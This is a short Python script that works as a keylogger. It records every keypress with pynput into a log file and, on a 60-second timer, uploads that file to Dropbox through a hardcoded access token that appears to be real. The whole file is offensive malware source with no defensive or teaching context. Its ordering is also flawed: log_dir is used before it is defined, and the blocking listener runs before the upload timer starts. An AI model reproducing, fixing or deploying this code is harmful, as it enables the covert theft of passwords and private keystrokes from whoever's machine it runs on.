import dropbox
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import time
from pynput.keyboard import Key, Listener
import threading
import logging


logging.basicConfig(filename=(log_dir + "test.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')

def on_press(Key): 
    logging.info(str(Key))

with Listener(on_press=on_press) as listener:
    listener.join()



log_dir = ""

class TransferData:
    def __init__(self, access_token):
        self.access_token = 'RANt4BUePOAAAAAAAAAACdZEolhDaXGoRiMSD_tAYemEfRRW9uNz9qad2UGf34VS'

    def upload_file(self, file_from, file_to):
        """upload a file to Dropbox using API v2
        """
        dbx = dropbox.Dropbox(self.access_token)

        with open(file_from, 'rb') as f:
            dbx.files_upload(f.read(), file_to)

def main():
    access_token = 'RANt4BUePOAAAAAAAAAACdZEolhDaXGoRiMSD_tAYemEfRRW9uNz9qad2UGf34VS'
    transferData = TransferData(access_token)

    file_from = 'test.txt'
    file_to = '/test_dropbox/test.txt'  # The full path to upload the file to, including the file name

    # API v2
    transferData.upload_file(file_from, file_to)




def wuf ():
    global timer

    if __name__ == '__main__':
        main()
    
    time.sleep(1)
    timer = threading.Timer(60, wuf)
    timer.start()

timer = threading.Timer(60, wuf)
timer.start()





